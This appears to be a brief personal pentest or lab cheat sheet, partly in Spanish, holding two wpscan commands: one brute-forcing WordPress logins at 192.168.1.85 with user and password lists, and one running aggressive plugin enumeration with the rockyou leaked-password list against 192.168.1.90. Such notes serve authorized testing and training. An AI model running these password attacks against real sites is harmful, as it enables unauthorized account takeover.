
Bruteforce a login
```
wpscan --url http://192.168.1.85/ --usernames ../enumeration/users --passwords passwd
```

Enumeración
```
wpscan --url http://192.168.1.90 --api-token <token> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --detection-mode aggressive --plugins-detection aggressive -t 10
```